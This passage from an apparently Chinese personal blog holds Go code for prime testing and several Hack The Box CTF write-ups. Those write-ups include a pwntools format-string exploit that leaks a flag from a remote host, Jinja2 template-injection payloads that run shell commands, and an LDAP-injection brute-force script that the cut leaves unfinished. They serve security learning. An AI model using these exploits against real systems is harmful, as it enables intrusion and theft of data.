class="hljs-params">(n *big.Int, length <span class="hljs-type">int64</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br>i := <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++ &#123;<br><span class="hljs-keyword">if</span> !fmod(n, GenerateBigNum(length).Int64()) &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">100</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>flag := <span class="hljs-literal">false</span><br><span class="hljs-keyword">for</span> &#123;<br>n := GenerateBigNum(<span class="hljs-number">20</span>)<br>flag = Fermat_Prime(n, <span class="hljs-number">20</span>)<br><span class="hljs-keyword">if</span> flag &#123;<br>fmt.Println(n.String())<br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="米勒拉宾素数判定算法"><a href="#米勒拉宾素数判定算法" class="headerlink" title="米勒拉宾素数判定算法"></a>米勒拉宾素数判定算法</h2><img src="/2022/11/14/%E5%A4%A7%E7%B4%A0%E6%95%B0%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95/b68bf149f8e2487681d054125319684b.png" class="" title="在这里插入图片描述"><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;math/big&quot;</span><br><span class="hljs-string">&quot;math/rand&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> one = <span class="hljs-built_in">new</span>(big.Int).SetInt64(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">var</span> zero = <span class="hljs-built_in">new</span>(big.Int).SetInt64(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">用于提供长度为n的数，用于提取大素数，</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateBigRange</span><span class="hljs-params">(n <span class="hljs-type">int64</span>)</span></span> *big.Int &#123;<br><span class="hljs-comment">//将go默认类型转化为big.Int类型</span><br>length := <span class="hljs-built_in">new</span>(big.Int).SetInt64(n)<br><span class="hljs-comment">//设置strng为int并给基数解释</span><br>re, _ := <span class="hljs-built_in">new</span>(big.Int).SetString(<span class="hljs-string">&quot;10&quot;</span>, <span class="hljs-number">10</span>)<br><span class="hljs-comment">//返回re**length%nil,这里为nil则不取模</span><br>re.Exp(re, length, <span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">return</span> re<br>&#125;<br><br><span class="hljs-comment">//生成大数</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateBigNum</span><span class="hljs-params">(n <span class="hljs-type">int64</span>)</span></span> *big.Int &#123;<br>numRange := GenerateBigRange(n)<br>ran := rand.New(rand.NewSource(time.Now().UnixNano())) <span class="hljs-comment">//创建的时候需要初始化其中一个值 用于生成随机数</span><br>ran.Seed(time.Now().UnixNano())<br>p := <span class="hljs-built_in">new</span>(big.Int).Rand(ran, numRange)<br><span class="hljs-keyword">return</span> p<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateA</span><span class="hljs-params">(n *big.Int)</span></span> *big.Int &#123;<br>a := <span class="hljs-built_in">new</span>(big.Int)<br><span class="hljs-keyword">for</span> &#123;<br>ran := rand.New(rand.NewSource(time.Now().UnixNano())) <span class="hljs-comment">//创建的时候需要初始化其中一个值 用于生成随机数</span><br>ran.Seed(time.Now().UnixNano())<br>a.Rand(ran, <span class="hljs-built_in">new</span>(big.Int).Sub(n, one))<br><span class="hljs-keyword">if</span> a.Cmp(<span class="hljs-built_in">new</span>(big.Int).SetInt64(<span class="hljs-number">2</span>)) == <span class="hljs-number">-1</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">return</span> a<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">miller</span><span class="hljs-params">(n *big.Int, t <span class="hljs-type">int64</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-comment">//将n表示为2^s*d</span><br>s := <span class="hljs-number">0</span><br>temp := <span class="hljs-built_in">new</span>(big.Int).Sub(n, one)<br><span class="hljs-keyword">for</span> <span class="hljs-built_in">new</span>(big.Int).And(temp, one) == zero &amp;&amp; temp.Cmp(zero) == <span class="hljs-number">0</span> &#123;<br>temp.Div(temp, <span class="hljs-built_in">new</span>(big.Int).SetInt64(<span class="hljs-number">2</span>))<br>s += <span class="hljs-number">1</span><br>&#125;<br>d := temp<br><span class="hljs-keyword">for</span> t != <span class="hljs-number">0</span> &#123;<br>t--<br><span class="hljs-comment">//生成2&lt;=a&lt;n-1随机数</span><br>a := GenerateA(n)<br>result1 := <span class="hljs-built_in">new</span>(big.Int).Exp(a, d, n)<br><span class="hljs-keyword">if</span> result1.Cmp(one) == <span class="hljs-number">0</span> || result1.Cmp(<span class="hljs-built_in">new</span>(big.Int).Sub(n, one)) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-keyword">for</span> r := <span class="hljs-number">1</span>; r &lt;= s<span class="hljs-number">-1</span> &amp;&amp; result1.Cmp(<span class="hljs-built_in">new</span>(big.Int).Sub(n, one)) != <span class="hljs-number">0</span>; r++ &#123;<br>result1.Exp(result1, <span class="hljs-built_in">new</span>(big.Int).SetInt64(<span class="hljs-number">2</span>), n)<br><span class="hljs-keyword">if</span> result1.Cmp(one) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> result1.Cmp(<span class="hljs-built_in">new</span>(big.Int).Sub(n, one)) != <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> flag <span class="hljs-type">bool</span><br><span class="hljs-keyword">for</span> &#123;<br>Randomint := GenerateBigNum(<span class="hljs-number">10</span>)<br>flag = miller(Randomint, <span class="hljs-number">100</span>)<br><span class="hljs-keyword">if</span> flag &#123;<br>fmt.Println(Randomint.String())<br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="两种算法特点"><a href="#两种算法特点" class="headerlink" title="两种算法特点"></a>两种算法特点</h2><p>①Miller-Rabin算法是目前主流的基于概率的素数测试算法，在构建密码安全体系中占有重要的地位。<br>②通过比较各种素数测试算法和对Miller-Rabin算法进行的仔细研究，证明在计算机中构建密码安全体系时， Miller-Rabin算法是完成素数测试的最佳选择。<br>③通过对Miller-Rabin 算法底层运算的优化，可以取得较以往实现更好的性能，这也是费马素性测试再无用武之地的原因。</p><p>参考博客<a href="https://blog.csdn.net/weixin_46447549/article/details/120770716">https://blog.csdn.net/weixin_46447549/article/details/120770716</a></p>]]></content>
    
    
    <categories>
      
      <category>信息系统安全实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn</title>
    <link href="/2022/11/01/pwn/"/>
    <url>/2022/11/01/pwn/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="racecar"><a href="#racecar" class="headerlink" title="racecar"></a><a href="https://app.hackthebox.com/challenges/racecar">racecar</a></h2><p><a href="https://pan.baidu.com/s/12vMb9HTnCqCWH7QdChRrsw?pwd=0m8e">附件</a> </p><img src="/2022/11/01/pwn/image-20221101205627365.png" class="" title="image-20221101205627365"><p>文件类型</p><img src="/2022/11/01/pwn/image-20221101212057633.png" class="" title="image-20221101212057633"><p>ELF binary, not stripped - which means debugging information’s still there. So let’s find out what it has.</p><p><a href="https://zhuanlan.zhihu.com/p/348777589">https://zhuanlan.zhihu.com/p/348777589</a></p><img src="/2022/11/01/pwn/image-20221101212908897.png" class="" title="image-20221101212908897"><p><a href="https://wangchujiang.com/linux-command/c/readelf.html">https://wangchujiang.com/linux-command/c/readelf.html</a></p><p>Ghidra打开</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">car_menu</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">int</span> iVar2;<br>  uint __seed;<br>  <span class="hljs-type">int</span> iVar3;<br>  <span class="hljs-type">size_t</span> sVar4;<br>  <span class="hljs-type">char</span> *__format;<br>  FILE *__stream;<br>  <span class="hljs-type">int</span> in_GS_OFFSET;<br>  undefined *puVar5;<br>  undefined4 uVar6;<br>  undefined4 uVar7;<br>  uint local_54;<br>  <span class="hljs-type">char</span> local_3c [<span class="hljs-number">44</span>];<br>  <span class="hljs-type">int</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">int</span> *)(in_GS_OFFSET + <span class="hljs-number">0x14</span>);<br>  uVar6 = <span class="hljs-number">0xffffffff</span>;<br>  uVar7 = <span class="hljs-number">0xffffffff</span>;<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_00011948);<br>    iVar1 = read_int(uVar6,uVar7);<br>    <span class="hljs-keyword">if</span> ((iVar1 != <span class="hljs-number">2</span>) &amp;&amp; (iVar1 != <span class="hljs-number">1</span>)) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%s[-] Invalid choice!%s\n&quot;</span>,&amp;DAT_00011548,&amp;DAT_00011538);<br>    &#125;<br>  &#125; <span class="hljs-keyword">while</span> ((iVar1 != <span class="hljs-number">2</span>) &amp;&amp; (iVar1 != <span class="hljs-number">1</span>));<br>  iVar2 = race_type();<br>  __seed = time((<span class="hljs-type">time_t</span> *)<span class="hljs-number">0x0</span>);<br>  srand(__seed);<br>  <span class="hljs-keyword">if</span> (((iVar1 == <span class="hljs-number">1</span>) &amp;&amp; (iVar2 == <span class="hljs-number">2</span>)) || ((iVar1 == <span class="hljs-number">2</span> &amp;&amp; (iVar2 == <span class="hljs-number">2</span>)))) &#123;<br>    iVar2 = rand();<br>    iVar2 = iVar2 % <span class="hljs-number">10</span>;<br>    iVar3 = rand();<br>    iVar3 = iVar3 % <span class="hljs-number">100</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (((iVar1 == <span class="hljs-number">1</span>) &amp;&amp; (iVar2 == <span class="hljs-number">1</span>)) || ((iVar1 == <span class="hljs-number">2</span> &amp;&amp; (iVar2 == <span class="hljs-number">1</span>)))) &#123;<br>    iVar2 = rand();<br>    iVar2 = iVar2 % <span class="hljs-number">100</span>;<br>    iVar3 = rand();<br>    iVar3 = iVar3 % <span class="hljs-number">10</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    iVar2 = rand();<br>    iVar2 = iVar2 % <span class="hljs-number">100</span>;<br>    iVar3 = rand();<br>    iVar3 = iVar3 % <span class="hljs-number">100</span>;<br>  &#125;<br>  local_54 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;<br>    sVar4 = <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;\n[*] Waiting for the race to finish...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (sVar4 &lt;= local_54) <span class="hljs-keyword">break</span>;<br>    <span class="hljs-built_in">putchar</span>((<span class="hljs-type">int</span>)<span class="hljs-string">&quot;\n[*] Waiting for the race to finish...&quot;</span>[local_54]);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;\n[*] Waiting for the race to finish...&quot;</span>[local_54] == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;<br>      sleep(<span class="hljs-number">0</span>);<br>    &#125;<br>    local_54 = local_54 + <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (((iVar1 == <span class="hljs-number">1</span>) &amp;&amp; (iVar2 &lt; iVar3)) || ((iVar1 == <span class="hljs-number">2</span> &amp;&amp; (iVar3 &lt; iVar2)))) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n\n[+] You won the race!! You get 100 coins!\n&quot;</span>,&amp;DAT_00011540);<br>    coins = coins + <span class="hljs-number">100</span>;<br>    puVar5 = &amp;DAT_00011538;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Current coins: [%d]%s\n&quot;</span>,coins,&amp;DAT_00011538);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[!] Do you have anything to say to the press after your big victory?\n&gt; %s&quot;</span>,<br>           &amp;DAT_000119de);<br>    __format = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x171</span>);<br>    __stream = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (__stream == (FILE *)<span class="hljs-number">0x0</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[-] Could not open flag.txt. Please contact the creator.\n&quot;</span>,&amp;DAT_00011548,puVar5) ;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0x69</span>);<br>    &#125;<br>    fgets(local_3c,<span class="hljs-number">0x2c</span>,__stream);<br>    read(<span class="hljs-number">0</span>,__format,<span class="hljs-number">0x170</span>);<br>    <span class="hljs-built_in">puts</span>(<br>        <span class="hljs-string">&quot;\n\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world  to know this: \x1b[0m&quot;</span><br>        );<br>    <span class="hljs-built_in">printf</span>(__format);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (((iVar1 == <span class="hljs-number">1</span>) &amp;&amp; (iVar3 &lt; iVar2)) || ((iVar1 == <span class="hljs-number">2</span> &amp;&amp; (iVar2 &lt; iVar3)))) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n\n[-] You lost the race and all your coins!\n&quot;</span>,&amp;DAT_00011548);<br>    coins = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Current coins: [%d]%s\n&quot;</span>,<span class="hljs-number">0</span>,&amp;DAT_00011538);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">int</span> *)(in_GS_OFFSET + <span class="hljs-number">0x14</span>)) &#123;<br>    __stack_chk_fail_local();<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>printf(__format)处存在<a href="https://owasp.org/www-community/attacks/Format_string_attack">Format string attack</a></p><img src="/2022/11/01/pwn/image-20221101214535041.png" class="" title="image-20221101214535041"><p>IDA反编译后</p><img src="/2022/11/01/pwn/image-20221101220156700.png" class="" title="image-20221101220156700"><img src="/2022/11/01/pwn/image-20221101222413146.png" class="" title="image-20221101222413146"><p>测试buf偏移</p><p><a href="https://github.com/ir0nstone/pwn-notes/blob/master/types/stack/format-string.md">https://github.com/ir0nstone/pwn-notes/blob/master/types/stack/format-string.md</a></p><img src="/2022/11/01/pwn/image-20221101230244223.png" class="" title="image-20221101230244223"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>offset_start_flag = <span class="hljs-number">12</span><br>len_of_flag = <span class="hljs-number">44</span><br>offset_end_flag = offset_start_flag + (<span class="hljs-number">44</span> // <span class="hljs-number">4</span>)     <span class="hljs-comment"># 44 characters / 4 bytes per hexadecimal = 11 hexadecimals</span><br> <br> <br>formatstring = <span class="hljs-string">&quot;&quot;</span><br> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(offset_start_flag, offset_end_flag):<br>    formatstring += <span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;$p &quot;</span><br> <br> <br>r = remote(<span class="hljs-string">&quot;165.227.224.62&quot;</span>, <span class="hljs-number">30412</span>)<br> <br>r.sendlineafter(<span class="hljs-string">&quot;Name: &quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;Nickname: &quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>, formatstring)<br>r.recv()<br>response = r.recv()<br> <br><span class="hljs-comment"># need to format output</span><br>preflag = (response.decode(<span class="hljs-string">&quot;utf-8&quot;</span>).split(<span class="hljs-string">&quot;m\n&quot;</span>))[<span class="hljs-number">1</span>]<br>preflag = preflag.split()<br> <br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> hexdecimal <span class="hljs-keyword">in</span> preflag:<br>    flag += p32(<span class="hljs-built_in">int</span>(hexdecimal, base=<span class="hljs-number">16</span>)).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}</p><p>参考wp：</p><p><a href="https://www.akihakune.com/blog/racecar/">https://www.akihakune.com/blog/racecar/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Format_string_attack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web</title>
    <link href="/2022/11/01/web/"/>
    <url>/2022/11/01/web/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h3 id="Templated"><a href="#Templated" class="headerlink" title="Templated"></a><a href="https://app.hackthebox.com/challenges/templated">Templated</a></h3><img src="/2022/11/01/web/image-20221101203438421.png" class="" title="image-20221101203438421"><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts">什么都没有，但是已经提示是模板注入了，get提交一下<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-title class_">/</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-number">2</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><img src="/2022/11/01/web/image-20221101203554495.png" class="" title="image-20221101203554495"><p>显然存在模板注入，找资料了</p><p><a href="https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee">https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee</a></p><p><a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/</a></p><p><a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p><p><a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/</a></p><p>这里的难点是找到可利用的类了，由于版本的不同网上大多数[72]类型的，对应的类是不一样的，所以不能直接使用</p><p>上面贴了很多博客，这里不一一叙述了，自行学习。</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request.application.__globals__.__builtins__.__import__</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><img src="/2022/11/01/web/image-20221101204331330.png" class="" title="image-20221101204331330"><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request.application.__globals__.__builtins__.__import__</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;cat flag.txt&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><img src="/2022/11/01/web/image-20221101204400213.png" class="" title="image-20221101204400213"><h3 id="Phonebook"><a href="#Phonebook" class="headerlink" title="Phonebook"></a><a href="https://app.hackthebox.com/challenges/phonebook">Phonebook</a></h3><p><a href="https://www.cnblogs.com/r00tgrok/p/ldap_injection_and_prevention.html">https://www.cnblogs.com/r00tgrok/p/ldap_injection_and_prevention.html</a></p><img src="/2022/11/01/web/image-20221102205727322.png" class="" title="image-20221102205727322"><p>通配符*登陆</p><img src="/2022/11/01/web/image-20221102205806706.png" class="" title="image-20221102205806706"><p>经过测试Reese，*也可以登陆那么现在要找flag了，search搜不到，LDAP注入是无法类似SQL直接查数据的，但是，上述的博客中存在，多次测试</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>*<br>f*<br>f1*<br></code></pre></td></tr></table></figure><p>按照这个思路，我们猜测Reese的密码就是flag那么根据flag格式有密码为HTB{*}形式的猜测，进行测试发现这个密码确实能登陆那么下面就好办了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>header = &#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0&quot;</span><br>&#125;<br>url = <span class="hljs-string">&quot;http://178.62.87.44:32207/login&quot;</span><br><br><span class="hljs-comment"># 测试字符集</span><br>chars = string.ascii_letters<br>chars += <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span 